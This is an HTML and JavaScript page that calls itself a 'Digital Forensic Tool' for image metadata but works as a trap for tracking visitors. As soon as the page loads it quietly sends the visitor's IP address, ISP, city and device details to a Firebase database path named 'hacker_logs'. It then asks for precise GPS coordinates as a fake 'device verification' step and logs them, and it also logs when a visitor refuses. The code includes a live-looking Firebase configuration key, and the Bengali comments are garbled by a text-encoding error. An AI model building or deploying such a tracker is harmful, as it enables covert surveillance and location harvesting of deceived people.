<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Secure Image Proof (Trap)</title>
    <!-- Piexif Library for Metadata -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/piexifjs/1.0.6/piexif.js"></script>
    
    <!-- Firebase SDK Setup -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        // ‡¶§‡ßã‡¶∞ ‡¶¶‡ßá‡¶ì‡ßü‡¶æ ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶®
        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        // Firebase ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡¶æ
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏‡ßá ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        window.sendDataToFirebase = function(data) {
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            set(newLogRef, {
                timestamp: new Date().toString(),
                ...data
            }).then(() => {
                console.log("Target Locked: Data sent to Firebase!");
            }).catch((error) => {
                console.error("Firebase Error: ", error);
            });
        }
    </script>

    <style>
        /* Neumorphism Design Style */
        :root { 
            --bg-color: #e0e5ec; 
            --text-color: #4a4a4a; 
            --shadow-light: #ffffff; 
            --shadow-dark: #a3b1c6; 
            --accent: #007bff; 
            --success: #00b894; 
            --danger: #ff4757; 
        }

        body { 
            background-color: var(--bg-color); 
            color: var(--text-color); 
            font-family: 'Segoe UI', sans-serif; 
            display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0; 
        }

        .mobile-container { 
            width: 90%; max-width: 400px; 
            background-color: var(--bg-color); 
            border-radius: 20px; padding: 20px; 
            box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light); 
            min-height: 600px; text-align: center; position: relative;
        }

        h2 { text-align: center; color: var(--text-color); margin-bottom: 20px; }
        
        /* Buttons */
        .neu-btn { 
            width: 100%; padding: 15px; border: none; border-radius: 12px; 
            background: var(--bg-color); 
            box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); 
            color: var(--text-color); font-weight: bold; font-size: 16px; 
            cursor: pointer; outline: none; transition: 0.2s; margin-bottom: 15px; 
        }
        .neu-btn:active { box-shadow: inset 4px 4px 8px var(--shadow-dark), inset -4px -4px 8px var(--shadow-light); }
        .neu-btn:disabled { color: #aaa; box-shadow: none; cursor: not-allowed; opacity: 0.6; }

        .btn-select { color: var(--accent); } 
        .btn-save { color: var(--success); }

        /* Upload Area */
        .upload-area { 
            text-align: center; padding: 20px; border-radius: 15px; 
            box-shadow: inset 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); 
            margin-bottom: 25px; 
        }
        
        input[type="file"] { display: none; }
        
        #preview { 
            width: 100%; max-width: 200px; height: auto; object-fit: contain; border-radius: 10px; 
            margin-top: 15px; display: none; 
            box-shadow: 4px 4px 8px var(--shadow-dark), -4px -4px 8px var(--shadow-light); 
            border: 3px solid var(--bg-color); 
            margin-left: auto; margin-right: auto; 
        }

        /* Status & Logs */
        .status-box { 
            padding: 15px; border-radius: 12px; margin-bottom: 20px; 
            font-size: 14px; font-weight: bold; display: none; 
        }
        .status-ok { color: var(--success); box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); }
        .status-error { color: var(--danger); box-shadow: inset 3px 3px 6px var(--shadow-dark), inset -3px -3px 6px var(--shadow-light); }

        /* Custom Modal (Alert Replacement) */
        .custom-modal {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 80%; background: var(--bg-color); padding: 20px;
            border-radius: 15px; 
            box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light);
            z-index: 100; display: none; flex-direction: column; align-items: center;
        }
        .custom-modal p { margin-bottom: 20px; font-weight: bold; }
        .modal-btn { width: auto; padding: 10px 20px; margin: 0; color: var(--accent); }

    </style>
</head>
<body>

    <div class="mobile-container">
        <!-- Custom Alert Modal -->
        <div id="customModal" class="custom-modal">
            <p id="modalMsg">Message here</p>
            <button class="neu-btn modal-btn" onclick="closeModal()">OK</button>
        </div>

        <h2>üïµÔ∏è Digital Forensic Tool</h2>
        <p style="font-size: 12px; color: #666; margin-top:-10px;">Secure Metadata Analysis & Logger</p>

        <div class="upload-area">
            <input type="file" id="fileInput" accept="image/jpeg, image/jpg, image/png">
            <button class="neu-btn btn-select" onclick="document.getElementById('fileInput').click()">
                üìÇ ‡¶õ‡¶¨‡¶ø ‡¶Ü‡¶™‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡ßÅ‡¶®
            </button>
            <img id="preview" src="">
        </div>

        <div id="statusBox" class="status-box"></div>

        <div id="actionButtons" style="display:none;">
            <button id="saveBtn" class="neu-btn btn-save" onclick="processAndTrap()" disabled>
                üíæ ‡¶è‡¶≠‡¶ø‡¶°‡ßá‡¶®‡ßç‡¶∏ ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡ßÅ‡¶® (Save)
            </button>
            <p style="font-size:11px; color:#888;">*IP & Location will be embedded securely.</p>
        </div>
    </div>

    <script>
        let currentImgData = null;
        let userLat = null; 
        let userLng = null;
        let ipData = { ip: "Tracing...", city: "Tracing...", org: "Tracing..." };

        // ‡ßß. ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá‡¶á ‡¶Ü‡¶á‡¶™‡¶ø ‡¶ñ‡ßã‡¶Å‡¶ú‡¶æ ‡¶∂‡ßÅ‡¶∞‡ßÅ (IP Logger)
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                ipData = data;
                console.log("Network Info Captured silently.");
                // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶õ‡¶æ‡ßú‡¶æ‡¶á ‡¶™‡ßç‡¶∞‡¶æ‡¶•‡¶Æ‡¶ø‡¶ï ‡¶Ü‡¶á‡¶™‡¶ø ‡¶°‡¶æ‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
                logToFirebase(false, "Page Load - IP Captured");
            })
            .catch(error => console.log("IP Fetch Error"));

        // ‡ß®. ‡¶õ‡¶¨‡¶ø ‡¶á‡¶Æ‡¶™‡ßÅ‡¶ü ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶ø‡¶Ç
        document.getElementById('fileInput').addEventListener('change', function(e) {
            let file = e.target.files[0];
            if (file) {
                let reader = new FileReader();
                reader.onload = function(event) {
                    currentImgData = event.target.result;
                    document.getElementById('preview').src = currentImgData;
                    document.getElementById('preview').style.display = 'block';
                    document.getElementById('actionButtons').style.display = 'block';
                    
                    // ‡¶õ‡¶¨‡¶ø ‡¶¶‡¶ø‡¶≤‡ßá‡¶á ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ö‡¶æ‡¶ì‡ßü‡¶æ ‡¶π‡¶¨‡ßá
                    requestLocation();
                }
                reader.readAsDataURL(file);
            }
        });

        // ‡ß©. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶∞‡¶ø‡¶ï‡ßã‡ßü‡ßá‡¶∏‡ßç‡¶ü
        function requestLocation() {
            let statusBox = document.getElementById('statusBox');
            statusBox.style.display = 'block';
            statusBox.className = 'status-box';
            statusBox.innerText = "‚è≥ ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶ö‡¶≤‡¶õ‡ßá (GPS)...";

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        userLat = position.coords.latitude;
                        userLng = position.coords.longitude;
                        
                        document.getElementById('saveBtn').disabled = false;
                        statusBox.className = 'status-box status-ok';
                        statusBox.innerHTML = `‚úÖ ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á‡¶° ‡¶á‡¶â‡¶ú‡¶æ‡¶∞! <br> <span style="font-size:11px">GPS: ${userLat.toFixed(4)}, ${userLng.toFixed(4)}</span>`;
                        
                        // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡¶æ‡¶ì‡ßü‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá‡¶á Firebase ‡¶è ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã (Main Trap)
                        logToFirebase(true, "GPS Permission Granted");
                    },
                    function(error) {
                        statusBox.className = 'status-box status-error';
                        statusBox.innerText = "‚ùå ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø‡•§";
                        showModal("‡¶∏‡¶§‡¶∞‡ßç‡¶ï‡¶§‡¶æ: ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶Ö‡¶´ ‡¶•‡¶æ‡¶ï‡¶≤‡ßá ‡¶™‡ßç‡¶∞‡ßÅ‡¶´ ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á‡¶° ‡¶π‡¶¨‡ßá ‡¶®‡¶æ‡•§");
                        
                        // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶°‡¶ø‡¶®‡¶æ‡¶á ‡¶ï‡¶∞‡¶≤‡ßá‡¶ì ‡¶≤‡¶ó ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá
                        logToFirebase(false, "GPS Permission Denied");
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                showModal("‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá ‡¶ú‡¶ø‡¶™‡¶ø‡¶è‡¶∏ ‡¶®‡ßá‡¶á!");
            }
        }

        // ‡ß™. ‡¶´‡¶æ‡¶Ø‡¶º‡¶æ‡¶∞‡¶≠‡ßá‡¶ú‡ßá ‡¶°‡¶æ‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶≤‡¶ú‡¶ø‡¶ï
        function logToFirebase(hasLocation, statusMsg) {
            let deviceLog = {
                ip: ipData.ip || "Unknown",
                city: ipData.city || "Unknown",
                isp: ipData.org || "Unknown", // ‡¶π‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶∞‡ßá‡¶∞ ‡¶á‡¶®‡ßç‡¶ü‡¶æ‡¶∞‡¶®‡ßá‡¶ü ‡¶™‡ßç‡¶∞‡ßã‡¶≠‡¶æ‡¶á‡¶°‡¶æ‡¶∞
                userAgent: navigator.userAgent, // ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞ ‡¶ì ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø
                platform: navigator.platform,
                latitude: hasLocation ? userLat : "Not Allowed",
                longitude: hasLocation ? userLng : "Not Allowed",
                actionStatus: statusMsg,
                captureTime: new Date().toLocaleString()
            };

            // ‡¶ó‡ßç‡¶≤‡ßã‡¶¨‡¶æ‡¶≤ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ‡¶ï‡¶≤ (‡¶Ø‡ßá‡¶ü‡¶æ ‡¶Æ‡¶°‡¶ø‡¶â‡¶≤‡ßá ‡¶Ü‡¶õ‡ßá)
            if(window.sendDataToFirebase) {
                window.sendDataToFirebase(deviceLog);
            }
        }

        // ‡ß´. ‡¶á‡¶Æ‡ßá‡¶ú ‡¶™‡ßç‡¶∞‡¶∏‡ßá‡¶∏‡¶ø‡¶Ç ‡¶è‡¶¨‡¶Ç ‡¶Æ‡ßá‡¶ü‡¶æ‡¶°‡¶æ‡¶ü‡¶æ ‡¶á‡¶®‡¶ú‡ßá‡¶ï‡¶∂‡¶®
        function processAndTrap() {
            if (!currentImgData || !userLat) {
                showModal("‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶°‡¶æ‡¶ü‡¶æ ‡¶õ‡¶æ‡ßú‡¶æ ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨ ‡¶®‡¶æ!");
                return;
            }

            let zeroth = {};
            let exif = {};
            let gps = {};

            // ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá‡¶∞ ‡¶Æ‡¶°‡ßá‡¶≤‡ßá‡¶∞ ‡¶ú‡¶æ‡ßü‡¶ó‡¶æ‡ßü ‡¶π‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶∞‡ßá‡¶∞ ‡¶Ü‡¶á‡¶™‡¶ø ‡¶¨‡¶∏‡¶ø‡ßü‡ßá ‡¶¶‡ßá‡¶ì‡ßü‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá
            zeroth[piexif.ImageIFD.Make] = ipData.org || "ISP Tracker"; 
            zeroth[piexif.ImageIFD.Model] = ipData.ip || "Target IP";
            zeroth[piexif.ImageIFD.Software] = "Forensic Tool v1.0";

            // ‡¶ú‡¶ø‡¶™‡¶ø‡¶è‡¶∏ ‡¶°‡¶æ‡¶ü‡¶æ ‡¶è‡¶®‡¶ï‡ßã‡¶°‡¶ø‡¶Ç
            gps[piexif.GPSIFD.GPSLatitudeRef] = userLat < 0 ? 'S' : 'N';
            gps[piexif.GPSIFD.GPSLatitude] = piexif.GPSHelper.degToDmsRational(Math.abs(userLat));
            gps[piexif.GPSIFD.GPSLongitudeRef] = userLng < 0 ? 'W' : 'E';
            gps[piexif.GPSIFD.GPSLongitude] = piexif.GPSHelper.degToDmsRational(Math.abs(userLng));

            let exifObj = {"0th": zeroth, "Exif": exif, "GPS": gps};
            let exifStr = piexif.dump(exifObj);
            
            // ‡¶õ‡¶¨‡¶ø‡¶§‡ßá ‡¶°‡¶æ‡¶ü‡¶æ ‡¶¢‡ßÅ‡¶ï‡¶ø‡ßü‡ßá ‡¶®‡¶§‡ßÅ‡¶® ‡¶á‡¶Æ‡ßá‡¶ú ‡¶§‡ßà‡¶∞‡¶ø
            let newImage = piexif.insert(exifStr, currentImgData);

            // ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶°‡¶æ‡¶â‡¶®‡¶≤‡ßã‡¶°
            let link = document.createElement('a');
            link.href = newImage;
            link.download = "Forensic_Evidence_" + Date.now() + ".jpg";
            link.click();
            
            showModal("üéâ ‡¶è‡¶≠‡¶ø‡¶°‡ßá‡¶®‡ßç‡¶∏ ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶ï‡¶æ‡¶≤‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá!");
            
            // ‡¶∂‡ßá‡¶∑‡¶¨‡¶æ‡¶∞‡ßá‡¶∞ ‡¶Æ‡¶§ ‡¶ï‡¶®‡¶´‡¶æ‡¶∞‡ßç‡¶Æ‡ßá‡¶∂‡¶® ‡¶≤‡¶ó
            logToFirebase(true, "File Downloaded - Full Success");
        }

        // ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶Æ‡ßã‡¶°‡¶æ‡¶≤ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        function showModal(msg) {
            document.getElementById('modalMsg').innerText = msg;
            document.getElementById('customModal').style.display = 'flex';
        }
        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
        }
    </script>
</body>
</html>